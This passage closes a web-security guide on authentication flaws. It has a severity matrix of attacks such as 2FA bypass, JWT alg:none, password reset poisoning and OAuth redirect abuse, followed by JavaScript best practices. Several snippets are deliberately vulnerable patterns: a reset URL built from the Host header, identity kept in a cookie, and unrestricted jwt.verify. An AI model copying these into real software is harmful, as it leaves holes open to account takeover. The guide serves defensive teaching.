## **21. 📊-Authentication-Vulnerability-Impact-Matrix**

|Vulnerability|Auth Needed|Impact|Severity|
|---|---|---|---|
|Username enumeration|None|Reduces brute force effort|🟡 Low-Med|
|Brute force (no protection)|None|Any account compromise|🔴 Critical|
|2FA direct navigation skip|Step 1 only|Full 2FA bypass|🔴 Critical|
|2FA flawed cookie logic|Own account|Access any account|🔴 Critical|
|OTP brute force|Step 1 only|2FA bypass|🔴 Critical|
|OTP in response|Step 1 only|Instant 2FA bypass|🔴 Critical|
|Weak remember-me cookie|None (compute it)|ATO without login|🔴 Critical|
|Reset token prediction|None|ATO — no credentials|🔴 Critical|
|Password reset poisoning|None|ATO via token theft|🔴 Critical|
|Reset token not revalidated POST|None|Reset any password|🔴 Critical|
|Password change — victim username|Own account|Change any password|🔴 Critical|
|JWT alg:none|None|ATO as any user|🔴 Critical|
|JWT algorithm confusion|None + public key|ATO as any user|🔴 Critical|
|JWT weak secret|None|ATO as any user|🔴 Critical|
|OAuth redirect_uri|None|Code theft → ATO|🔴 Critical|
|HTTP Basic brute force|None|Service access|🔴 Critical|
|2FA CSRF disable|Victim visits page|Silently disable 2FA|🟠 High|
|Response time enumeration|None|Valid username list|🟡 Medium|

---

## **22. 🛡️-Developer-Best-Practices**

---

### **🔑 General Auth Hygiene**

|Area|Recommendation|
|---|---|
|🔐 Error Messages|Always use generic: "Invalid username or password"|
|⏱️ Login Attempts|Rate limit + exponential backoff + account lockout|
|👁️ Session Management|Regenerate IDs on login, set `HttpOnly` + `Secure` + `SameSite`|
|🔒 MFA|Enforce server-side — never trust client-side 2FA state|
|🧩 Password Recovery|Cryptographically random tokens, 1-hour expiry, single-use|
|🌐 HTTPS|Mandatory for ALL auth endpoints — no exceptions|
|🧾 Logging|Log failures safely — never log raw passwords|
|🏛️ Frameworks|Use Passport.js, Spring Security, Django Auth — don't roll your own!|
|🔄 Password Reset URL|Hardcode base URL from config — NEVER from Host/X-Forwarded-Host|
|🪙 JWT Algorithms|Explicitly allowlist: `algorithms: ['HS256']` — never let token choose!|

---

### **🧩 Secure Password Reset (Code Example)**

```javascript
// ✅ SAFE — cryptographically random token, hashed in DB
const crypto = require('crypto');

async function generateResetToken(userId) {
    const token = crypto.randomBytes(32).toString('hex'); // 256-bit random!
    const hash = crypto.createHash('sha256').update(token).digest('hex');
    await db.resets.create({
        userId, tokenHash: hash,
        expiresAt: Date.now() + 3600000,  // 1 hour
        used: false
    });
    return token; // Send raw token in email, store the HASH
}

// ❌ VULNERABLE — building URL from request header
const url = `https://${req.headers.host}/reset?token=${token}`;

// ✅ SAFE — hardcoded from config
const url = `${process.env.BASE_URL}/reset?token=${token}`;

// ✅ Validate token AGAIN at POST (not just GET)
app.post('/reset', async (req, res) => {
    const userId = await validateAndConsumeToken(req.body.token); // MUST validate here too!
    if (!userId) return res.status(400).json({ error: 'Invalid or expired token' });
    await changePassword(userId, req.body.newPassword);
    await invalidateAllSessions(userId); // Log out all sessions!
});
```

---

### **📱 Secure 2FA Session Handling (Code Example)**

```javascript
// ❌ VULNERABLE — user identity in a user-readable cookie
res.cookie('account', req.body.username); // Attacker changes this cookie!

// ✅ SAFE — server-side session state only
app.post('/login', (req, res) => {
    if (credentialsValid) {
        req.session.pendingUserId = user.id;  // Server-side!
        req.session.mfaPending = true;         // NOT authenticated yet!
        req.session.authenticated = false;
        res.redirect('/login2');
    }
});

app.post('/login2', (req, res) => {
    if (!req.session.pendingUserId || !req.session.mfaPending)
        return res.status(401).redirect('/login'); // Must have come from Step 1!

    const userId = req.session.pendingUserId; // From SERVER session — not request!
    if (!validateOTP(userId, req.body.otp))
        return res.status(401).json({ error: 'Invalid code' });

    req.session.authenticated = true;   // NOW it's authenticated!
    req.session.userId = userId;
    delete req.session.mfaPending;
    delete req.session.pendingUserId;
    res.redirect('/dashboard');
});
```

---

### **🪙 Secure JWT Implementation**

```javascript
// ❌ Never let the token decide its own algorithm
jwt.verify(token, secret);

// ✅ Always explicitly specify the allowed algorithm
jwt.verify(token, secret, { algorithms: ['HS256'] }); // Blocks alg:none, RS256->HS256!

// ✅ Use strong secrets (256-bit minimum for HMAC)
// Generate: node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

---
